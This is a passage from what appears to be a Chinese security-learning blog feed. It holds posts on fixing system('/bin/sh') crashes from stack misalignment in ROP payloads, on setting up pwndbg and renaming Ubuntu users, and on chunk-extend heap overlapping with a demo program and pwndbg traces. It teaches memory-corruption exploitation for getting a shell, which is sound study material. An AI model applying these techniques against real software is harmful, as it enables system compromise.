REGISTERS ]──────────────────────────────────────────</span><br><span class="line"> RAX  0x7ffff7b95e17 ◂— sub    eax, 0x622f0063 /* &#x27;-c&#x27; */</span><br><span class="line"> RBX  0x0</span><br><span class="line"> RCX  0x7ffff7b95e1f ◂— jae    0x7ffff7b95e89 /* &#x27;sh&#x27; */</span><br><span class="line"> RDX  0x0</span><br><span class="line"> RDI  0x2</span><br><span class="line"> RSI  0x7ffff7dcf6a0 (intr) ◂— 0x0</span><br><span class="line"> R8   0x7ffff7dcf600 (quit) ◂— 0x0</span><br><span class="line"> R9   0x7ffff7dced80 (initial) ◂— 0x0</span><br><span class="line"> R10  0x8</span><br><span class="line"> R11  0x346</span><br><span class="line"> R12  0x5555555546f4 ◂— 0x68732f6e69622f /* &#x27;/bin/sh&#x27; */</span><br><span class="line"> R13  0x7fffffffe080 ◂— 0x1</span><br><span class="line"> R14  0x0</span><br><span class="line"> R15  0x0</span><br><span class="line"> RBP  0x7fffffffde60 ◂— 0x0</span><br><span class="line">*RSP  0x7fffffffde01 ◂— 0x1700007fff000000</span><br><span class="line">*RIP  0x7ffff7a3140b (do_system+1099) ◂— call   0x7ffff7a21230</span><br><span class="line">───────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────</span><br><span class="line">   0x7ffff7a313ed &lt;do_system+1069&gt;    mov    qword ptr [rsp + 0x58], 0</span><br><span class="line">   0x7ffff7a313f6 &lt;do_system+1078&gt;    movq   xmm0, qword ptr [rsp + 8]</span><br><span class="line">   0x7ffff7a313fc &lt;do_system+1084&gt;    mov    qword ptr [rsp + 8], rax</span><br><span class="line">   0x7ffff7a31401 &lt;do_system+1089&gt;    movhps xmm0, qword ptr [rsp + 8]</span><br><span class="line">   0x7ffff7a31406 &lt;do_system+1094&gt;    movaps xmmword ptr [rsp + 0x40], xmm0</span><br><span class="line"> ► 0x7ffff7a3140b &lt;do_system+1099&gt;    call   sigaction &lt;sigaction&gt;</span><br><span class="line">        sig: 0x2</span><br><span class="line">        act: 0x7ffff7dcf6a0 (intr) ◂— 0x0</span><br><span class="line">        oact: 0x0</span><br><span class="line"> </span><br><span class="line">   0x7ffff7a31410 &lt;do_system+1104&gt;    lea    rsi, [rip + 0x39e1e9] &lt;0x7ffff7dcf600&gt;</span><br><span class="line">   0x7ffff7a31417 &lt;do_system+1111&gt;    xor    edx, edx</span><br><span class="line">   0x7ffff7a31419 &lt;do_system+1113&gt;    mov    edi, 3</span><br><span class="line">   0x7ffff7a3141e &lt;do_system+1118&gt;    call   sigaction &lt;sigaction&gt;</span><br><span class="line"> </span><br><span class="line">   0x7ffff7a31423 &lt;do_system+1123&gt;    xor    edx, edx</span><br><span class="line">───────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────</span><br><span class="line">00:0000│ rsp  0x7fffffffde01 ◂— 0x1700007fff000000</span><br><span class="line">01:0008│      0x7fffffffde09 ◂— 0x1000007ffff7b95e</span><br><span class="line">02:0010│      0x7fffffffde11 ◂— 0x300007fffffffdf</span><br><span class="line">03:0018│      0x7fffffffde19 ◂— 0x7000000000000000</span><br><span class="line">04:0020│      0x7fffffffde21 ◂— 0x1c00007ffff7a314</span><br><span class="line">05:0028│      0x7fffffffde29 ◂— 0x3800007fffffffde</span><br><span class="line">06:0030│      0x7fffffffde31 ◂— 0x7ffff7ffe7</span><br><span class="line">07:0038│      0x7fffffffde39 ◂— 0x1f00000000000000</span><br><span class="line">─────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────</span><br><span class="line"> ► f 0     7ffff7a3140b do_system+1099</span><br><span class="line">   f 1 7000005555555546</span><br><span class="line">   f 2 f700005555555546</span><br><span class="line">   f 3       7ffff7a03b</span><br><span class="line">   f 4 8800000020000000</span><br><span class="line">   f 5       7fffffffe0</span><br><span class="line">   f 6 4a00000001000000</span><br><span class="line">   f 7       5555555546</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后查看$rsp+0x40的位置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p/x $rsp+0x40</span><br><span class="line">$3 = 0x7fffffffde41</span><br></pre></td></tr></table></figure><p>已经未对齐了，继续执行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line"></span><br><span class="line">Thread 2.1 &quot;a.out&quot; received signal SIGSEGV, Segmentation fault.</span><br><span class="line">0x000000000040f946 in do_system ()</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">─────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────</span><br><span class="line"> RAX  0x492be5 ◂— sub    eax, 0x622f0063 /* &#x27;-c&#x27; */</span><br><span class="line"> RBX  0x0</span><br><span class="line"> RCX  0x492bed ◂— jae    0x492c57 /* &#x27;sh&#x27; */</span><br><span class="line"> RDX  0x0</span><br><span class="line"> RDI  0x2</span><br><span class="line"> RSI  0x6bbdc0 (intr) ◂— 0x0</span><br><span class="line"> R8   0x6bbd20 (quit) ◂— 0x0</span><br><span class="line"> R9   0x6bb8e0 (initial) ◂— 0x0</span><br><span class="line"> R10  0x8</span><br><span class="line"> R11  0x346</span><br><span class="line"> R12  0x492444 ◂— 0x68732f6e69622f /* &#x27;/bin/sh&#x27; */</span><br><span class="line"> R13  0x0</span><br><span class="line"> R14  0x6b9018 (_GLOBAL_OFFSET_TABLE_+24) —▸ 0x440670 (__strcpy_ssse3) ◂— mov    rcx, rsi</span><br><span class="line"> R15  0x0</span><br><span class="line"> RBP  0x7fffffffde20 ◂— 0x0</span><br><span class="line"> RSP  0x7fffffffddc1 ◂— 0xe500007fffffffe3</span><br><span class="line"> RIP  0x40f946 (do_system+1062) ◂— movaps xmmword ptr [rsp + 0x40], xmm0</span><br><span class="line">───────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────</span><br><span class="line">   0x40f928 &lt;do_system+1032&gt;    mov    qword ptr [rsp + 8], rcx</span><br><span class="line">   0x40f92d &lt;do_system+1037&gt;    mov    qword ptr [rsp + 0x58], 0</span><br><span class="line">   0x40f936 &lt;do_system+1046&gt;    movq   xmm0, qword ptr [rsp + 8]</span><br><span class="line">   0x40f93c &lt;do_system+1052&gt;    mov    qword ptr [rsp + 8], rax</span><br><span class="line">   0x40f941 &lt;do_system+1057&gt;    movhps xmm0, qword ptr [rsp + 8]</span><br><span class="line"> ► 0x40f946 &lt;do_system+1062&gt;    movaps xmmword ptr [rsp + 0x40], xmm0</span><br><span class="line">   0x40f94b &lt;do_system+1067&gt;    call   sigaction &lt;sigaction&gt;</span><br><span class="line"> </span><br><span class="line">   0x40f950 &lt;do_system+1072&gt;    lea    rsi, [rip + 0x2ac3c9] &lt;0x6bbd20&gt;</span><br><span class="line">   0x40f957 &lt;do_system+1079&gt;    xor    edx, edx</span><br><span class="line">   0x40f959 &lt;do_system+1081&gt;    mov    edi, 3</span><br><span class="line">   0x40f95e &lt;do_system+1086&gt;    call   sigaction &lt;sigaction&gt;</span><br><span class="line">───────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────</span><br><span class="line">00:0000│ rsp  0x7fffffffddc1 ◂— 0xe500007fffffffe3</span><br><span class="line">01:0008│      0x7fffffffddc9 ◂— 0xb0000000000492b /* &#x27;+I&#x27; */</span><br><span class="line">02:0010│      0x7fffffffddd1 ◂— 0x700000015004a4f /* &#x27;OJ&#x27; */</span><br><span class="line">03:0018│      0x7fffffffddd9 ◂— 0x4000000000000000</span><br><span class="line">04:0020│      0x7fffffffdde1 ◂— 0xdc000000000040f4</span><br><span class="line">05:0028│      0x7fffffffdde9 ◂— 0x6800007fffffffdd</span><br><span class="line">06:0030│      0x7fffffffddf1 ◂— 0x7000000000006be2</span><br><span class="line">07:0038│      0x7fffffffddf9 ◂— 0x500000000000001</span><br><span class="line">─────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────</span><br><span class="line"> ► f 0           40f946 do_system+1062</span><br><span class="line">   f 1 700000000000400b</span><br><span class="line">   f 2  900000000004018</span><br><span class="line">   f 3             4011</span><br><span class="line">   f 4                0</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br></pre></td></tr></table></figure><p>已经crash掉。</p><h2 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h2><p>1.改变payload的长度</p><p>​    直接更改payload的长度，在栈溢出的时候栈的地址会不同，将栈地址+1，不行的话，继续增加，最多16次就一定会遇到栈对齐的长度。</p><p>2.栈转移</p><p>​    当有些payload有长度限制时，可以使用栈转移，之后如果栈的地址还是不同的话，继续+1，对齐。</p><p>3.execve</p><p>​    调用system的话可能会crash掉，那么可以使用execve函数，只不过这个函数的参数比system的参数多，在之前的ret2syscall 中也有讲到，之前讲的是32位，那64位的话就是参数构造不一样而已：rdi,rsi,rdx。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">execve</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> * filename,<span class="keyword">char</span> * <span class="keyword">const</span> argv[ ],<span class="keyword">char</span> * <span class="keyword">const</span> envp[ ])</span></span>;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;在64位的glibc上payload调用system导致crash的问题&quot;&gt;&lt;a href=&quot;#在64位的glibc上payload调用system导致crash的问题&quot; class=&quot;headerlink&quot; title=&quot;在64位的gl</summary>
      
    
    
    
    
    <category term="PWN" scheme="http://example.com/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>pwndbg和Linux改用户名及密码踩坑</title>
    <link href="http://example.com/2021/03/23/pwndbg%E5%92%8CLinux%E6%94%B9%E7%94%A8%E6%88%B7%E5%90%8D%E5%8F%8A%E5%AF%86%E7%A0%81%E8%B8%A9%E5%9D%91/"/>
    <id>http://example.com/2021/03/23/pwndbg%E5%92%8CLinux%E6%94%B9%E7%94%A8%E6%88%B7%E5%90%8D%E5%8F%8A%E5%AF%86%E7%A0%81%E8%B8%A9%E5%9D%91/</id>
    <published>2021-03-22T16:10:56.000Z</published>
    <updated>2021-06-02T02:44:34.534Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="关于pwndbg"><a href="#关于pwndbg" class="headerlink" title="关于pwndbg"></a>关于pwndbg</h2><p>安装：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/pwndbg/pwndbg</span><br><span class="line">cd pwndbg</span><br><span class="line">sudo ./setup.sh</span><br></pre></td></tr></table></figure><p>gdb后如果是peda或者其他的插件，可以改下配置文件.gdbinit，在home中，或者root目录下，加上这么一句，其他注释掉。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source /home/yourname/pwndbg/gdbinit.py</span><br></pre></td></tr></table></figure><h2 id="关于Ubuntu修改用户名和密码"><a href="#关于Ubuntu修改用户名和密码" class="headerlink" title="关于Ubuntu修改用户名和密码"></a>关于Ubuntu修改用户名和密码</h2><h3 id="修改root密码"><a href="#修改root密码" class="headerlink" title="修改root密码"></a>修改root密码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo passwd root</span><br></pre></td></tr></table></figure><h3 id="修改用户名密码"><a href="#修改用户名密码" class="headerlink" title="修改用户名密码"></a>修改用户名密码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd xxx  //xxx表示用户名</span><br></pre></td></tr></table></figure><h3 id="修改用户名"><a href="#修改用户名" class="headerlink" title="修改用户名"></a>修改用户名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo gedit /etc/passwd</span><br></pre></td></tr></table></figure><p>打开该文件后找到当前用户名的一行(单用户一般是文件最后一行)，将旧用户名改为新的用户名，但不要动/home/旧用户名的名字，否则重启后可能会无法从图形界面登录系统。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">oldUser:x:1000:1000:A User ,,,:/home/oldUser:/bin/bash</span><br></pre></td></tr></table></figure><p>比如上面的是我需要修改的行，那么我只将开头的旧用户名oldUser修改为新的用户名，比如newUser就可以了。(A User是用户名全称，也可以修改.)</p><p>修改后：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">newUser:x:1000:1000:newUser ,,,:/home/oldUser:/bin/bash</span><br></pre></td></tr></table></figure><p>修改保存后，切换到root。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gedit /etc/shadow</span><br></pre></td></tr></table></figure><p>找到你的旧用户名并将其修改为新用户名，修改后保存</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gedit /etc/sudoers</span><br></pre></td></tr></table></figure><p>在<code>root ALL=(ALL:ALL) ALL</code>后添加一行<code>newUser ALL=(ALL:ALL) ALL</code>(旧用户的类似内容也可以删除了)，其中newUser是新的用户名。</p><p>修改保存后重启系统</p><h3 id="修改用户目录名"><a href="#修改用户目录名" class="headerlink" title="修改用户目录名"></a>修改用户目录名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo gedit /etc/passwd</span><br></pre></td></tr></table></figure><p>还是在我们之前修改的那一行，只不过这一次是将/home/旧用户名修改为/home/新用户名。</p><p>然后再执行以下指令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo mv /home/oldUser /home/newUser</span><br></pre></td></tr></table></figure><p>重启，完了。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h2 id=&quot;关于pwndbg&quot;&gt;&lt;a href=&quot;#关于pwndbg&quot; class=&quot;headerlink&quot; title=&quot;关于pwndbg&quot;&gt;&lt;/a&gt;关于pwndbg&lt;/h2&gt;&lt;p&gt;安装：&lt;/p&gt;
&lt;figure class=&quot;highlight </summary>
      
    
    
    
    
    <category term="PWN" scheme="http://example.com/tags/PWN/"/>
    
    <category term="Linux" scheme="http://example.com/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>Chunk Extend and Overlapping</title>
    <link href="http://example.com/2021/03/22/chunk-extend-and-overlapping/"/>
    <id>http://example.com/2021/03/22/chunk-extend-and-overlapping/</id>
    <published>2021-03-21T16:00:00.000Z</published>
    <updated>2021-06-01T16:12:31.388Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="Chunk-Extend-and-Overlapping"><a href="#Chunk-Extend-and-Overlapping" class="headerlink" title="Chunk Extend and Overlapping"></a>Chunk Extend and Overlapping</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>chunk extend 是堆漏洞的一种常见利用手法，通过extend可以实现chunk overlapping（块重叠）的效果。这种利用的方法需要以下的条件：</p><ul><li>  程序中存在堆的漏洞</li><li>  漏洞可以控制chunk header中的数据</li></ul><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>这种利用的技术能够产生在于ptmalloc在对堆chunk进行操作时使用的各种宏。</p><p>在ptmalloc中，获取chunk块大小的宏：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Get size, ignoring use bits */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunksize(p) (chunksize_nomask(p) &amp; ~(SIZE_BITS))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Like chunksize, but do not mask SIZE_BITS.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunksize_nomask(p) ((p)-&gt;mchunk_size)</span></span><br></pre></td></tr></table></figure><p>一种是直接获取，不忽略掩码部分，另外一种是忽略掩码部分。</p><p>在 ptmalloc 中，获取下一 chunk 块地址的宏：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Ptr to next physical malloc_chunk. */</span> </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> next_chunk(p) ((mchunkptr)(((char *) (p)) + chunksize(p)))</span></span><br></pre></td></tr></table></figure><p>在 ptmalloc 中，获取前一个 chunk 信息的宏：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Size of the chunk below P.  Only valid if prev_inuse (P).  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> prev_size(p) ((p)-&gt;mchunk_prev_size)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Ptr to previous physical malloc_chunk.  Only valid if prev_inuse (P).  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> prev_chunk(p) ((mchunkptr)(((char *) (p)) - prev_size(p)))</span></span><br></pre></td></tr></table></figure><p>在 ptmalloc 中，判断当前 chunk 是否是 use 状态的宏：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> inuse(p)</span></span><br><span class="line">    ((((mchunkptr)(((<span class="keyword">char</span> *) (p)) + chunksize(p)))-&gt;mchunk_size) &amp; PREV_INUSE)</span><br></pre></td></tr></table></figure><p>chunk extend 就是通过控制 size 、prev_size 、prev_inuse域来实现跨越块操作从而导致 overlapping 的。</p><h2 id="基本示例"><a href="#基本示例" class="headerlink" title="基本示例"></a>基本示例</h2><h3 id="示例1：对inuse的fastbin进行extend"><a href="#示例1：对inuse的fastbin进行extend" class="headerlink" title="示例1：对inuse的fastbin进行extend"></a>示例1：对inuse的fastbin进行extend</h3><p>示例代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *p, *q;</span><br><span class="line">    p = <span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//分配第一个0x10的chunk</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//分配第二个0x10的chunk</span></span><br><span class="line">    *(<span class="keyword">long</span> <span class="keyword">long</span> *)((<span class="keyword">long</span> <span class="keyword">long</span>)p - <span class="number">0x8</span>) = <span class="number">0x41</span>;<span class="comment">// 修改第一个块的size域</span></span><br><span class="line">    <span class="built_in">free</span>(p);</span><br><span class="line">    q = <span class="built_in">malloc</span>(<span class="number">0x30</span>);<span class="comment">// 实现extend，控制了第二个块的内容</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里编译的时候使用了<code>-g</code>参数，可以在gdb调试的时候在任意行下断点。方法：b + 行号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; n</span><br><span class="line">8    malloc(0x10);//分配第二个0x10的chunk</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">─────────────────────────────────────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────────────────────────────────────</span><br><span class="line"> RAX  0x602010 ◂— 0x0</span><br><span class="line"> RBX  0x0</span><br><span class="line"> RCX  0x7ffff7dd1b20 (main_arena) ◂— 0x100000000</span><br><span class="line"> RDX  0x602010 ◂— 0x0</span><br><span class="line"> RDI  0x7ffff7dd1b20 (main_arena) ◂— 0x100000000</span><br><span class="line"> RSI  0x602020 ◂— 0x0</span><br><span class="line"> R8   0x602000 ◂— 0x0</span><br><span class="line"> R9   0xd</span><br><span class="line"> R10  0x7ffff7dd1b78 (main_arena+88) —▸ 0x602020 ◂— 0x0</span><br><span class="line"> R11  0x0</span><br><span class="line"> R12  0x400470 (_start) ◂— xor    ebp, ebp</span><br><span class="line"> R13  0x7fffffffdf90 ◂— 0x1</span><br><span class="line"> R14  0x0</span><br><span class="line"> R15  0x0</span><br><span class="line"> RBP  0x7fffffffdeb0 —▸ 0x4005c0 (__libc_csu_init) ◂— push   r15</span><br><span class="line"> RSP  0x7fffffffdea0 —▸ 0x602010 ◂— 0x0</span><br><span class="line"> RIP  0x40057c (main+22) ◂— mov    edi, 0x10</span><br><span class="line">──────────────────────────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────────────────────────</span><br><span class="line">   0x40056e &lt;main+8&gt;     mov    edi, 0x10</span><br><span class="line">   0x400573 &lt;main+13&gt;    call   malloc@plt &lt;0x400450&gt;</span><br><span class="line"> </span><br><span class="line">   0x400578 &lt;main+18&gt;    mov    qword ptr [rbp - 0x10], rax</span><br><span class="line"> ► 0x40057c &lt;main+22&gt;    mov    edi, 0x10</span><br><span class="line">   0x400581 &lt;main+27&gt;    call   malloc@plt &lt;0x400450&gt;</span><br><span class="line"> </span><br><span class="line">   0x400586 &lt;main+32&gt;    mov    rax, qword ptr [rbp - 0x10]</span><br><span class="line">   0x40058a &lt;main+36&gt;    sub    rax, 8</span><br><span class="line">   0x40058e &lt;main+40&gt;    mov    qword ptr [rax], 0x41</span><br><span class="line">   0x400595 &lt;main+47&gt;    mov    rax, qword ptr [rbp - 0x10]</span><br><span class="line">   0x400599 &lt;main+51&gt;    mov    rdi, rax</span><br><span class="line">   0x40059c &lt;main+54&gt;    call   free@plt &lt;0x400430&gt;</span><br><span class="line">───────────────────────────────────────────────────────────────────────[ SOURCE (CODE) ]───────────────────────────────────────────────────────────────────────</span><br><span class="line">In file: /home/gwt/Desktop/1.c</span><br><span class="line">    3 #include&lt;stdlib.h&gt;</span><br><span class="line">    4 int main()</span><br><span class="line">    5 &#123;</span><br><span class="line">    6     void *p, *q;</span><br><span class="line">    7     p = malloc(0x10);//分配第一个0x10的chunk</span><br><span class="line"> ►  8     malloc(0x10);//分配第二个0x10的chunk</span><br><span class="line">    9     *(long long *)((long long)p - 0x8) = 0x41;// 修改第一个块的size域</span><br><span class="line">   10     free(p);</span><br><span class="line">   11     q = malloc(0x30);// 实现extend，控制了第二个块的内容</span><br><span class="line">   12     return 0;</span><br><span class="line">   13 &#125;</span><br><span class="line">───────────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────────</span><br><span class="line">00:0000│ rsp  0x7fffffffdea0 —▸ 0x602010 ◂— 0x0</span><br><span class="line">01:0008│      0x7fffffffdea8 ◂— 0x0</span><br><span class="line">02:0010│ rbp  0x7fffffffdeb0 —▸ 0x4005c0 (__libc_csu_init) ◂— push   r15</span><br><span class="line">03:0018│      0x7fffffffdeb8 —▸ 0x7ffff7a2d830 (__libc_start_main+240) ◂— mov    edi, eax</span><br><span class="line">04:0020│      0x7fffffffdec0 ◂— 0x0</span><br><span class="line">05:0028│      0x7fffffffdec8 —▸ 0x7fffffffdf98 —▸ 0x7fffffffe30e ◂— 0x77672f656d6f682f (&#x27;/home/gw&#x27;)</span><br><span class="line">06:0030│      0x7fffffffded0 ◂— 0x100000000</span><br><span class="line">07:0038│      0x7fffffffded8 —▸ 0x400566 (main) ◂— push   rbp</span><br><span class="line">─────────────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────────────</span><br><span class="line"> ► f 0           40057c main+22</span><br><span class="line">   f 1     7ffff7a2d830 __libc_start_main+240</span><br><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">          0x400000           0x401000 r-xp     1000 0      /home/gwt/Desktop/a.out</span><br><span class="line">          0x600000           0x601000 r--p     1000 0      /home/gwt/Desktop/a.out</span><br><span class="line">          0x601000           0x602000 rw-p     1000 1000   /home/gwt/Desktop/a.out</span><br><span class="line">          0x602000           0x623000 rw-p    21000 0      [heap]</span><br><span class="line">    0x7ffff7a0d000     0x7ffff7bcd000 r-xp   1c0000 0      /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">    0x7ffff7bcd000     0x7ffff7dcd000 ---p   200000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">    0x7ffff7dcd000     0x7ffff7dd1000 r--p     4000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">    0x7ffff7dd1000     0x7ffff7dd3000 rw-p     2000 1c4000 /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">    0x7ffff7dd3000     0x7ffff7dd7000 rw-p     4000 0      </span><br><span class="line">    0x7ffff7dd7000     0x7ffff7dfd000 r-xp    26000 0      /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">    0x7ffff7fdc000     0x7ffff7fdf000 rw-p     3000 0      </span><br><span class="line">    0x7ffff7ff7000     0x7ffff7ffa000 r--p     3000 0      [vvar]</span><br><span class="line">    0x7ffff7ffa000     0x7ffff7ffc000 r-xp     2000 0      [vdso]</span><br><span class="line">    0x7ffff7ffc000     0x7ffff7ffd000 r--p     1000 25000  /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">    0x7ffff7ffd000     0x7ffff7ffe000 rw-p     1000 26000  /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">    0x7ffff7ffe000     0x7ffff7fff000 rw-p     1000 0      </span><br><span 